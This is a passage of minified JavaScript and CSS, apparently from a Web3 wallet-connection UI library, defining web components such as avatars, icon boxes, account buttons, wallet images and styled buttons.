`;var BR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const h$e={browser:qPe,dao:WPe,defi:HPe,defiAlt:VPe,eth:KPe,layers:ZPe,lock:JPe,login:QPe,network:t$e,nft:r$e,noun:i$e,profile:a$e,system:u$e,coinbase:zPe,meld:XPe,onrampCard:n$e,moonpay:e$e,stripe:l$e,paypal:s$e,google:GPe,pencil:o$e,lightbulb:YPe,solana:c$e};let Bw=class extends he{constructor(){super(...arguments),this.name="browser",this.size="md"}render(){return this.style.cssText=`
       --local-size: var(--wui-visual-size-${this.size});
   `,F`${h$e[this.name]}`}};Bw.styles=[ht,d$e];BR([V()],Bw.prototype,"name",void 0);BR([V()],Bw.prototype,"size",void 0);Bw=BR([me("wui-visual")],Bw);/**
 * @license
 * Copyright 2018 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const ye=r=>r??Qn,Wt={getSpacingStyles(r,e){if(Array.isArray(r))return r[e]?`var(--wui-spacing-${r[e]})`:void 0;if(typeof r=="string")return`var(--wui-spacing-${r})`},getFormattedDate(r){return new Intl.DateTimeFormat("en-US",{month:"short",day:"numeric"}).format(r)},getHostName(r){try{return new URL(r).hostname}catch{return""}},getTruncateString({string:r,charsStart:e,charsEnd:t,truncate:i}){return r.length<=e+t?r:i==="end"?`${r.substring(0,e)}...`:i==="start"?`...${r.substring(r.length-t)}`:`${r.substring(0,Math.floor(e))}...${r.substring(r.length-Math.floor(t))}`},generateAvatarColors(r){const t=r.toLowerCase().replace(/^0x/iu,"").replace(/[^a-f0-9]/gu,"").substring(0,6).padEnd(6,"0"),i=this.hexToRgb(t),n=getComputedStyle(document.documentElement).getPropertyValue("--w3m-border-radius-master"),o=100-3*Number(n?.replace("px","")),a=`${o}% ${o}% at 65% 40%`,c=[];for(let l=0;l<5;l+=1){const u=this.tintColor(i,.15*l);c.push(`rgb(${u[0]}, ${u[1]}, ${u[2]})`)}return`
    --local-color-1: ${c[0]};
    --local-color-2: ${c[1]};
    --local-color-3: ${c[2]};
    --local-color-4: ${c[3]};
    --local-color-5: ${c[4]};
    --local-radial-circle: ${a}
   `},hexToRgb(r){const e=parseInt(r,16),t=e>>16&255,i=e>>8&255,n=e&255;return[t,i,n]},tintColor(r,e){const[t,i,n]=r,s=Math.round(t+(255-t)*e),o=Math.round(i+(255-i)*e),a=Math.round(n+(255-n)*e);return[s,o,a]},isNumber(r){return{number:/^[0-9]+$/u}.number.test(r)},getColorTheme(r){return r||(typeof window<"u"&&window.matchMedia?window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light":"dark")},splitBalance(r){const e=r.split(".");return e.length===2?[e[0],e[1]]:["0","00"]},roundNumber(r,e,t){return r.toString().length>=e?Number(r).toFixed(t):r},formatNumberToLocalString(r,e=2){return r===void 0?"0.00":typeof r=="number"?r.toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e}):parseFloat(r).toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e})}},f$e=ge`
  :host {
    display: flex;
    width: inherit;
    height: inherit;
  }
`;var Ac=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Lo=class extends he{render(){return this.style.cssText=`
      flex-direction: ${this.flexDirection};
      flex-wrap: ${this.flexWrap};
      flex-basis: ${this.flexBasis};
      flex-grow: ${this.flexGrow};
      flex-shrink: ${this.flexShrink};
      align-items: ${this.alignItems};
      justify-content: ${this.justifyContent};
      column-gap: ${this.columnGap&&`var(--wui-spacing-${this.columnGap})`};
      row-gap: ${this.rowGap&&`var(--wui-spacing-${this.rowGap})`};
      gap: ${this.gap&&`var(--wui-spacing-${this.gap})`};
      padding-top: ${this.padding&&Wt.getSpacingStyles(this.padding,0)};
      padding-right: ${this.padding&&Wt.getSpacingStyles(this.padding,1)};
      padding-bottom: ${this.padding&&Wt.getSpacingStyles(this.padding,2)};
      padding-left: ${this.padding&&Wt.getSpacingStyles(this.padding,3)};
      margin-top: ${this.margin&&Wt.getSpacingStyles(this.margin,0)};
      margin-right: ${this.margin&&Wt.getSpacingStyles(this.margin,1)};
      margin-bottom: ${this.margin&&Wt.getSpacingStyles(this.margin,2)};
      margin-left: ${this.margin&&Wt.getSpacingStyles(this.margin,3)};
    `,F`<slot></slot>`}};Lo.styles=[ht,f$e];Ac([V()],Lo.prototype,"flexDirection",void 0);Ac([V()],Lo.prototype,"flexWrap",void 0);Ac([V()],Lo.prototype,"flexBasis",void 0);Ac([V()],Lo.prototype,"flexGrow",void 0);Ac([V()],Lo.prototype,"flexShrink",void 0);Ac([V()],Lo.prototype,"alignItems",void 0);Ac([V()],Lo.prototype,"justifyContent",void 0);Ac([V()],Lo.prototype,"columnGap",void 0);Ac([V()],Lo.prototype,"rowGap",void 0);Ac([V()],Lo.prototype,"gap",void 0);Ac([V()],Lo.prototype,"padding",void 0);Ac([V()],Lo.prototype,"margin",void 0);Lo=Ac([me("wui-flex")],Lo);const p$e=ge`
  :host {
    display: block;
    width: var(--local-width);
    height: var(--local-height);
    border-radius: var(--wui-border-radius-3xl);
    box-shadow: 0 0 0 8px var(--wui-color-gray-glass-005);
    overflow: hidden;
    position: relative;
  }

  :host([data-variant='generated']) {
    --mixed-local-color-1: var(--local-color-1);
    --mixed-local-color-2: var(--local-color-2);
    --mixed-local-color-3: var(--local-color-3);
    --mixed-local-color-4: var(--local-color-4);
    --mixed-local-color-5: var(--local-color-5);
  }

  @supports (background: color-mix(in srgb, white 50%, black)) {
    :host([data-variant='generated']) {
      --mixed-local-color-1: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-1)
      );
      --mixed-local-color-2: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-2)
      );
      --mixed-local-color-3: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-3)
      );
      --mixed-local-color-4: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-4)
      );
      --mixed-local-color-5: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-5)
      );
    }
  }

  :host([data-variant='generated']) {
    box-shadow: 0 0 0 8px var(--wui-color-gray-glass-005);
    background: radial-gradient(
      var(--local-radial-circle),
      #fff 0.52%,
      var(--mixed-local-color-5) 31.25%,
      var(--mixed-local-color-3) 51.56%,
      var(--mixed-local-color-2) 65.63%,
      var(--mixed-local-color-1) 82.29%,
      var(--mixed-local-color-4) 100%
    );
  }

  :host([data-variant='default']) {
    box-shadow: 0 0 0 8px var(--wui-color-gray-glass-005);
    background: radial-gradient(
      75.29% 75.29% at 64.96% 24.36%,
      #fff 0.52%,
      #f5ccfc 31.25%,
      #dba4f5 51.56%,
      #9a8ee8 65.63%,
      #6493da 82.29%,
      #6ebdea 100%
    );
  }
`;var x4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let lp=class extends he{constructor(){super(...arguments),this.imageSrc=void 0,this.alt=void 0,this.address=void 0,this.size="xl"}render(){return this.style.cssText=`
    --local-width: var(--wui-icon-box-size-${this.size});
    --local-height: var(--wui-icon-box-size-${this.size});
    `,F`${this.visualTemplate()}`}visualTemplate(){if(this.imageSrc)return this.dataset.variant="image",F`<wui-image src=${this.imageSrc} alt=${this.alt??"avatar"}></wui-image>`;if(this.address){this.dataset.variant="generated";const e=Wt.generateAvatarColors(this.address);return this.style.cssText+=`
 ${e}`,null}return this.dataset.variant="default",null}};lp.styles=[ht,p$e];x4([V()],lp.prototype,"imageSrc",void 0);x4([V()],lp.prototype,"alt",void 0);x4([V()],lp.prototype,"address",void 0);x4([V()],lp.prototype,"size",void 0);lp=x4([me("wui-avatar")],lp);const g$e=ge`
  :host {
    display: inline-flex;
    justify-content: center;
    align-items: center;
    position: relative;
    overflow: hidden;
    background-color: var(--wui-color-gray-glass-020);
    border-radius: var(--local-border-radius);
    border: var(--local-border);
    box-sizing: content-box;
    width: var(--local-size);
    height: var(--local-size);
    min-height: var(--local-size);
    min-width: var(--local-size);
  }

  @supports (background: color-mix(in srgb, white 50%, black)) {
    :host {
      background-color: color-mix(in srgb, var(--local-bg-value) var(--local-bg-mix), transparent);
    }
  }
`;var P0=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let sl=class extends he{constructor(){super(...arguments),this.size="md",this.backgroundColor="accent-100",this.iconColor="accent-100",this.background="transparent",this.border=!1,this.borderColor="wui-color-bg-125",this.icon="copy"}render(){const e=this.iconSize||this.size,t=this.size==="lg",i=this.size==="xl",n=t?"12%":"16%",s=t?"xxs":i?"s":"3xl",o=this.background==="gray",a=this.background==="opaque",c=this.backgroundColor==="accent-100"&&a||this.backgroundColor==="success-100"&&a||this.backgroundColor==="error-100"&&a||this.backgroundColor==="inverse-100"&&a;let l=`var(--wui-color-${this.backgroundColor})`;return c?l=`var(--wui-icon-box-bg-${this.backgroundColor})`:o&&(l=`var(--wui-color-gray-${this.backgroundColor})`),this.style.cssText=`
       --local-bg-value: ${l};
       --local-bg-mix: ${c||o?"100%":n};
       --local-border-radius: var(--wui-border-radius-${s});
       --local-size: var(--wui-icon-box-size-${this.size});
       --local-border: ${this.borderColor==="wui-color-bg-125"?"2px":"1px"} solid ${this.border?`var(--${this.borderColor})`:"transparent"}
   `,F` <wui-icon color=${this.iconColor} size=${e} name=${this.icon}></wui-icon> `}};sl.styles=[ht,fr,g$e];P0([V()],sl.prototype,"size",void 0);P0([V()],sl.prototype,"backgroundColor",void 0);P0([V()],sl.prototype,"iconColor",void 0);P0([V()],sl.prototype,"iconSize",void 0);P0([V()],sl.prototype,"background",void 0);P0([V({type:Boolean})],sl.prototype,"border",void 0);P0([V()],sl.prototype,"borderColor",void 0);P0([V()],sl.prototype,"icon",void 0);sl=P0([me("wui-icon-box")],sl);const m$e=ge`
  :host {
    display: block;
  }

  button {
    border-radius: var(--wui-border-radius-3xl);
    background: var(--wui-color-gray-glass-002);
    display: flex;
    gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-3xs) var(--wui-spacing-xs) var(--wui-spacing-3xs)
      var(--wui-spacing-xs);
    border: 1px solid var(--wui-color-gray-glass-005);
  }

  button:disabled {
    background: var(--wui-color-gray-glass-015);
  }

  button:disabled > wui-text {
    color: var(--wui-color-gray-glass-015);
  }

  button:disabled > wui-flex > wui-text {
    color: var(--wui-color-gray-glass-015);
  }

  button:disabled > wui-image,
  button:disabled > wui-flex > wui-avatar {
    filter: grayscale(1);
  }

  button:has(wui-image) {
    padding: var(--wui-spacing-3xs) var(--wui-spacing-3xs) var(--wui-spacing-3xs)
      var(--wui-spacing-xs);
  }

  wui-text {
    color: var(--wui-color-fg-100);
  }

  wui-flex > wui-text {
    color: var(--wui-color-fg-200);
  }

  wui-image,
  wui-icon-box {
    border-radius: var(--wui-border-radius-3xl);
    width: 24px;
    height: 24px;
    box-shadow: 0 0 0 2px var(--wui-color-gray-glass-005);
  }

  wui-flex {
    border-radius: var(--wui-border-radius-3xl);
    border: 1px solid var(--wui-color-gray-glass-005);
    background: var(--wui-color-gray-glass-005);
    padding: 4px var(--wui-spacing-m) 4px var(--wui-spacing-xxs);
  }

  button.local-no-balance {
    border-radius: 0px;
    border: none;
    background: transparent;
  }

  wui-avatar {
    width: 20px;
    height: 20px;
    box-shadow: 0 0 0 2px var(--wui-color-accent-glass-010);
  }

  @media (max-width: 500px) {
    button {
      gap: 0px;
      padding: var(--wui-spacing-3xs) var(--wui-spacing-xs) !important;
      height: 32px;
    }
    wui-image,
    wui-icon-box,
    button > wui-text {
      visibility: hidden;
      width: 0px;
      height: 0px;
    }
    button {
      border-radius: 0px;
      border: none;
      background: transparent;
      padding: 0px;
    }
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled > wui-flex > wui-text {
      color: var(--wui-color-fg-175);
    }

    button:active:enabled > wui-flex > wui-text {
      color: var(--wui-color-fg-175);
    }
  }
`;var Tu=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Oa=class extends he{constructor(){super(...arguments),this.networkSrc=void 0,this.avatarSrc=void 0,this.balance=void 0,this.isUnsupportedChain=void 0,this.disabled=!1,this.loading=!1,this.address="",this.profileName="",this.charsStart=4,this.charsEnd=6}render(){return F`
      <button
        ?disabled=${this.disabled}
        class=${ye(this.balance?void 0:"local-no-balance")}
      >
        ${this.balanceTemplate()}
        <wui-flex gap="xxs" alignItems="center">
          <wui-avatar
            .imageSrc=${this.avatarSrc}
            alt=${this.address}
            address=${this.address}
          ></wui-avatar>
          <wui-text variant="paragraph-600" color="inherit">
            ${this.address?Wt.getTruncateString({string:this.profileName||this.address,charsStart:this.profileName?18:this.charsStart,charsEnd:this.profileName?0:this.charsEnd,truncate:this.profileName?"end":"middle"}):null}
          </wui-text>
        </wui-flex>
      </button>
    `}balanceTemplate(){if(this.isUnsupportedChain)return F` <wui-icon-box
          size="sm"
          iconColor="error-100"
          backgroundColor="error-100"
          icon="warningCircle"
        ></wui-icon-box>
        <wui-text variant="paragraph-600" color="inherit"> Switch Network</wui-text>`;if(this.balance){const e=this.networkSrc?F`<wui-image src=${this.networkSrc}></wui-image>`:F`
            <wui-icon-box
              size="sm"
              iconColor="fg-200"
              backgroundColor="fg-300"
              icon="networkPlaceholder"
            ></wui-icon-box>
          `,t=this.loading?F`<wui-loading-spinner size="md" color="fg-200"></wui-loading-spinner>`:F`<wui-text variant="paragraph-600" color="inherit"> ${this.balance}</wui-text>`;return F`${e} ${t}`}return null}};Oa.styles=[ht,fr,m$e];Tu([V()],Oa.prototype,"networkSrc",void 0);Tu([V()],Oa.prototype,"avatarSrc",void 0);Tu([V()],Oa.prototype,"balance",void 0);Tu([V({type:Boolean})],Oa.prototype,"isUnsupportedChain",void 0);Tu([V({type:Boolean})],Oa.prototype,"disabled",void 0);Tu([V({type:Boolean})],Oa.prototype,"loading",void 0);Tu([V()],Oa.prototype,"address",void 0);Tu([V()],Oa.prototype,"profileName",void 0);Tu([V()],Oa.prototype,"charsStart",void 0);Tu([V()],Oa.prototype,"charsEnd",void 0);Oa=Tu([me("wui-account-button")],Oa);const w$e=ge`
  :host {
    position: relative;
    background-color: var(--wui-color-gray-glass-002);
    display: flex;
    justify-content: center;
    align-items: center;
    width: var(--local-size);
    height: var(--local-size);
    border-radius: inherit;
    border-radius: var(--local-border-radius);
  }

  :host > wui-flex {
    overflow: hidden;
    border-radius: inherit;
    border-radius: var(--local-border-radius);
  }

  :host::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-color-gray-glass-010);
    pointer-events: none;
  }

  :host([name='Extension'])::after {
    border: 1px solid var(--wui-color-accent-glass-010);
  }

  :host([data-wallet-icon='allWallets']) {
    background-color: var(--wui-all-wallets-bg-100);
  }

  :host([data-wallet-icon='allWallets'])::after {
    border: 1px solid var(--wui-color-accent-glass-010);
  }

  wui-icon[data-parent-size='inherit'] {
    width: 75%;
    height: 75%;
    align-items: center;
  }

  wui-icon[data-parent-size='sm'] {
    width: 18px;
    height: 18px;
  }

  wui-icon[data-parent-size='md'] {
    width: 24px;
    height: 24px;
  }

  wui-icon[data-parent-size='lg'] {
    width: 42px;
    height: 42px;
  }

  wui-icon[data-parent-size='full'] {
    width: 100%;
    height: 100%;
  }

  :host > wui-icon-box {
    position: absolute;
    overflow: hidden;
    right: -1px;
    bottom: -2px;
    z-index: 1;
    border: 2px solid var(--wui-color-bg-150, #1e1f1f);
    padding: 1px;
  }
`;var c2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Rd=class extends he{constructor(){super(...arguments),this.size="md",this.name="",this.installed=!1,this.badgeSize="xs"}render(){let e="xxs";return this.size==="lg"?e="m":this.size==="md"?e="xs":e="xxs",this.style.cssText=`
       --local-border-radius: var(--wui-border-radius-${e});
       --local-size: var(--wui-wallet-image-size-${this.size});
   `,this.walletIcon&&(this.dataset.walletIcon=this.walletIcon),F`
      <wui-flex justifyContent="center" alignItems="center"> ${this.templateVisual()} </wui-flex>
    `}templateVisual(){return this.imageSrc?F`<wui-image src=${this.imageSrc} alt=${this.name}></wui-image>`:this.walletIcon?F`<wui-icon
        data-parent-size="md"
        size="md"
        color="inherit"
        name=${this.walletIcon}
      ></wui-icon>`:F`<wui-icon
      data-parent-size=${this.size}
      size="inherit"
      color="inherit"
      name="walletPlaceholder"
    ></wui-icon>`}};Rd.styles=[fr,ht,w$e];c2([V()],Rd.prototype,"size",void 0);c2([V()],Rd.prototype,"name",void 0);c2([V()],Rd.prototype,"imageSrc",void 0);c2([V()],Rd.prototype,"walletIcon",void 0);c2([V({type:Boolean})],Rd.prototype,"installed",void 0);c2([V()],Rd.prototype,"badgeSize",void 0);Rd=c2([me("wui-wallet-image")],Rd);const b$e=ge`
  :host {
    position: relative;
    border-radius: var(--wui-border-radius-xxs);
    width: 40px;
    height: 40px;
    overflow: hidden;
    background: var(--wui-color-gray-glass-002);
    display: flex;
    justify-content: center;
    align-items: center;
    flex-wrap: wrap;
    gap: var(--wui-spacing-4xs);
    padding: 3.75px !important;
  }

  :host::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-color-gray-glass-010);
    pointer-events: none;
  }

  :host > wui-wallet-image {
    width: 14px;
    height: 14px;
    border-radius: var(--wui-border-radius-5xs);
  }

  :host > wui-flex {
    padding: 2px;
    position: fixed;
    overflow: hidden;
    left: 34px;
    bottom: 8px;
    background: var(--dark-background-150, #1e1f1f);
    border-radius: 50%;
    z-index: 2;
    display: flex;
  }
`;var bee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const aA=4;let Jv=class extends he{constructor(){super(...arguments),this.walletImages=[]}render(){const e=this.walletImages.length<aA;return F`${this.walletImages.slice(0,aA).map(({src:t,walletName:i})=>F`
            <wui-wallet-image
              size="inherit"
              imageSrc=${t}
              name=${ye(i)}
            ></wui-wallet-image>
          `)}
      ${e?[...Array(aA-this.walletImages.length)].map(()=>F` <wui-wallet-image size="inherit" name=""></wui-wallet-image>`):null}
      <wui-flex>
        <wui-icon-box
          size="xxs"
          iconSize="xxs"
          iconcolor="success-100"
          backgroundcolor="success-100"
          icon="checkmark"
          background="opaque"
        ></wui-icon-box>
      </wui-flex>`}};Jv.styles=[ht,b$e];bee([V({type:Array})],Jv.prototype,"walletImages",void 0);Jv=bee([me("wui-all-wallets-image")],Jv);const v$e=ge`
  :host {
    width: var(--local-width);
    position: relative;
  }

  button {
    border: none;
    border-radius: var(--local-border-radius);
    width: var(--local-width);
    white-space: nowrap;
  }

  /* -- Sizes --------------------------------------------------- */
  button[data-size='md'] {
    padding: 8.2px var(--wui-spacing-l) 9px var(--wui-spacing-l);
    height: 36px;
  }

  button[data-size='md'][data-icon-left='true'][data-icon-right='false'] {
    padding: 8.2px var(--wui-spacing-l) 9px var(--wui-spacing-s);
  }

  button[data-size='md'][data-icon-right='true'][data-icon-left='false'] {
    padding: 8.2px var(--wui-spacing-s) 9px var(--wui-spacing-l);
  }

  button[data-size='lg'] {
    padding: var(--wui-spacing-m) var(--wui-spacing-2l);
    height: 48px;
  }

  /* -- Variants --------------------------------------------------------- */
  button[data-variant='main'] {
    background-color: var(--wui-color-accent-100);
    color: var(--wui-color-inverse-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-variant='inverse'] {
    background-color: var(--wui-color-inverse-100);
    color: var(--wui-color-inverse-000);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-010);
  }

  button[data-variant='accent'] {
    background-color: var(--wui-color-accent-glass-010);
    color: var(--wui-color-accent-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  button[data-variant='accent-error'] {
    background: var(--wui-color-error-glass-015);
    color: var(--wui-color-error-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-error-glass-010);
  }

  button[data-variant='accent-success'] {
    background: var(--wui-color-success-glass-015);
    color: var(--wui-color-success-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-success-glass-010);
  }

  button[data-variant='neutral'] {
    background: transparent;
    color: var(--wui-color-fg-100);
    border: none;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  /* -- Focus states --------------------------------------------------- */
  button[data-variant='main']:focus-visible:enabled {
    background-color: var(--wui-color-accent-090);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0 0 0 4px var(--wui-color-accent-glass-020);
  }
  button[data-variant='inverse']:focus-visible:enabled {
    background-color: var(--wui-color-inverse-100);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-gray-glass-010),
      0 0 0 4px var(--wui-color-accent-glass-020);
  }
  button[data-variant='accent']:focus-visible:enabled {
    background-color: var(--wui-color-accent-glass-010);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0 0 0 4px var(--wui-color-accent-glass-020);
  }
  button[data-variant='accent-error']:focus-visible:enabled {
    background: var(--wui-color-error-glass-015);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-error-100),
      0 0 0 4px var(--wui-color-error-glass-020);
  }
  button[data-variant='accent-success']:focus-visible:enabled {
    background: var(--wui-color-success-glass-015);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-success-100),
      0 0 0 4px var(--wui-color-success-glass-020);
  }
  button[data-variant='neutral']:focus-visible:enabled {
    background: var(--wui-color-gray-glass-005);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-gray-glass-010),
      0 0 0 4px var(--wui-color-gray-glass-002);
  }

  /* -- Hover & Active states ----------------------------------------------------------- */
  @media (hover: hover) and (pointer: fine) {
    button[data-variant='main']:hover:enabled {
      background-color: var(--wui-color-accent-090);
    }

    button[data-variant='main']:active:enabled {
      background-color: var(--wui-color-accent-080);
    }

    button[data-variant='accent']:hover:enabled {
      background-color: var(--wui-color-accent-glass-015);
    }

    button[data-variant='accent']:active:enabled {
      background-color: var(--wui-color-accent-glass-020);
    }

    button[data-variant='accent-error']:hover:enabled {
      background: var(--wui-color-error-glass-020);
      color: var(--wui-color-error-100);
    }

    button[data-variant='accent-error']:active:enabled {
      background: var(--wui-color-error-glass-030);
      color: var(--wui-color-error-100);
    }

    button[data-variant='accent-success']:hover:enabled {
      background: var(--wui-color-success-glass-020);
      color: var(--wui-color-success-100);
    }

    button[data-variant='accent-success']:active:enabled {
      background: var(--wui-color-success-glass-030);
      color: var(--wui-color-success-100);
    }

    button[data-variant='neutral']:hover:enabled {
      background: var(--wui-color-gray-glass-002);
    }

    button[data-variant='neutral']:active:enabled {
      background: var(--wui-color-gray-glass-005);
    }

    button[data-size='lg'][data-icon-left='true'][data-icon-right='false'] {
      padding-left: var(--wui-spacing-m);
    }

    button[data-size='lg'][data-icon-right='true'][data-icon-left='false'] {
      padding-right: var(--wui-spacing-m);
    }
  }

  /* -- Disabled state --------------------------------------------------- */
  button:disabled {
    background-color: var(--wui-color-gray-glass-002);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    color: var(--wui-color-gray-glass-020);
    cursor: not-allowed;
  }

  button > wui-text {
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
    opacity: var(--local-opacity-100);
  }

  ::slotted(*) {
    transition: opacity var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: opacity;
    opacity: var(--local-opacity-100);
  }

  wui-loading-spinner {
    position: absolute;
    left: 50%;
    top: 50%;
    transform: translate(-50%, -50%);
    opacity: var(--local-opacity-000);
  }
`;var Qd=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const rq={main:"inverse-100",inverse:"inverse-000",accent:"accent-100","accent-error":"error-100","accent-success":"success-100",neutral:"fg-100",disabled:"gray-glass-020"},y$e={lg:"paragraph-600",md:"small-600"},x$e={lg:"md",md:"md"};let pc=class extends he{constructor(){super(...arguments),this.size="lg",this.disabled=!1,this.fullWidth=!1,this.loading=!1,this.variant="main",this.hasIconLeft=!1,this.hasIconRight=!1,this.borderRadius="m"}render(){this.style.cssText=`
    --local-width: ${this.fullWidth?"100%":"auto"};
    --local-opacity-100: ${this.loading?0:1};
    --local-opacity-000: ${this.loading?1:0};
    --local-border-radius: var(--wui-border-radius-${this.borderRadius});
    `;const e=this.textVariant??y$e[this.size];return F`
      <button
        data-variant=${this.variant}
        data-icon-left=${this.hasIconLeft}
        data-icon-right=${this.hasIconRight}
        data-size=${this.size}
        ?disabled=${this.disabled}
      >
        ${this.loadingTemplate()}
        <slot name="iconLeft" @slotchange=${()=>this.handleSlotLeftChange()}></slot>
        <wui-text variant=${e} color="inherit">
          <slot></slot>
        </wui-text>
        <slot name="iconRight" @slotchange=${()=>this.handleSlotRightChange()}></slot>
      </button>
    `}handleSlotLeftChange(){this.hasIconLeft=!0}handleSlotRightChange(){this.hasIconRight=!0}loadingTemplate(){if(this.loading){const e=x$e[this.size],t=this.disabled?rq.disabled:rq[this.variant];return F`<wui-loading-spinner color=${t} size=${e}></wui-loading-spinner>`}return F``}};pc.styles=[ht,fr,v$e];Qd([V()],pc.prototype,"size",void 0);Qd([V({type:Boolean})],pc.prototype,"disabled",void 0);Qd([V({type:Boolean})],pc.prototype,"fullWidth",void 0);Qd([V({type:Boolean})],pc.prototype,"loading",void 0);Qd([V()],pc.prototype,"variant",void 0);Qd([V({type:Boolean})],pc.prototype,"hasIconLeft",void 0);Qd([V({type:Boolean})],pc.prototype,"hasIconRight",void 0);Qd([V()],pc.prototype,"borderRadius",void 0);Qd([V()],pc.prototype,"textVariant",void 0);pc=Qd([me("wui-button")],pc);const vee=xe`<svg  viewBox="0 0 48 54" fill="none">
  <path
    d="M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z"
  />
</svg>`,C$e=ge`
  :host {
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 104px;
    row-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-xs) 10px;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: clamp(0px, var(--wui-border-radius-xs), 20px);
    position: relative;
  }

  wui-shimmer[data-type='network'] {
    border: none;
    -webkit-clip-path: var(--wui-path-network);
    clip-path: var(--wui-path-network);
  }

  svg {
    position: absolute;
    width: 48px;
    height: 54px;
    z-index: 1;
  }

  svg > path {
    stroke: var(--wui-color-gray-glass-010);
    stroke-width: 1px;
  }

  @media (max-width: 350px) {
    :host {
      width: 100%;
    }
  }
